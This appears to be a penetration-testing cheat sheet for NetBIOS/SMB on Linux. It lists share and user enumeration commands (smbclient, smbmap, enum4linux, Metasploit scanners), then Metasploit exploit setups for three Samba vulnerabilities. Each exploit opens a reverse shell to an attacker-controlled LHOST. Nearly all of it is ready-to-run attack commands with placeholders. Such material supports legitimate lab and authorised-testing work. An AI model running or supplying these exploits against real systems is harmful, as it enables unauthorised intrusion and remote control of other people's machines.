# NetBios (Linux)

## Enumeration

#### SMBClient

##### Enumerate SMB Shares (basic)
```bash
smbclient -L [IP] -p 139
```

##### Connect to an SMB Share (anonymous)
```bash
smbclient //[IP]/[SHARE] -p 139
```

##### Connect to an SMB Share (Windows-style path)
```bash
smbclient \\\\[IP]\\[SHARE] -U [USER] -p 139
```

##### Connect to an SMB Share (Linux-style path with user)
```bash
smbclient //[IP]/[SHARE] -U [USER] -p 139
```

#### nmblookup
##### Enumerate Hostname
```bash
nmblookup -A [IP]
```

### List Shares

```bash
smbmap -H [IP]
```
```bash
smbmap -u anonymous -p anonymous -H [IP]
```
```bash
smbclient -L \\\\[IP]
nmap --script smb-enum-shares -p 139,445 [IP]
```

##### enum4linux
```bash
enum4linux -a [IP]
```

### Metasploit

##### smb_version
```bash
use scanner/smb/smb_version
set RHOSTS [IP]
set RPORT 139
run
```

##### smb_enumshares
```bash
use scanner/smb/smb_enumshares
set RHOSTS [IP]
set RPORT 139
run
```

##### smb_enumusers
```bash
use scanner/smb/smb_enumusers
set RHOSTS [IP]
set RPORT 139
run
```

##### smb_lookupsid
```bash
use scanner/smb/smb_lookupsid
set RHOSTS [IP]
set RPORT 139
run
```

##### smb_enumgroups
```bash
use scanner/smb/smb_enumgroups
set RHOSTS [IP]
set RPORT 139
run
```


---
---


## Exploitation

### Metasploit

##### samba_usermap_script
```bash
use exploit/linux/samba/usermap_script
set RHOSTS [IP]
set RPORT 139
set PAYLOAD cmd/unix/reverse_netcat
set LHOST [IP]
set LPORT [port]
run
```

##### samba_trans2open
```bash
use exploit/linux/samba/trans2open
set RHOSTS [IP]
set RPORT 139
set PAYLOAD cmd/unix/reverse
set LHOST [IP]
set LPORT [port]
run
```

##### samba_is_known_pipename
```bash
use exploit/linux/samba/is_known_pipename
set RHOSTS [IP]
set RPORT 139
set PAYLOAD cmd/unix/reverse
set LHOST [IP]
set LPORT [port]
run
```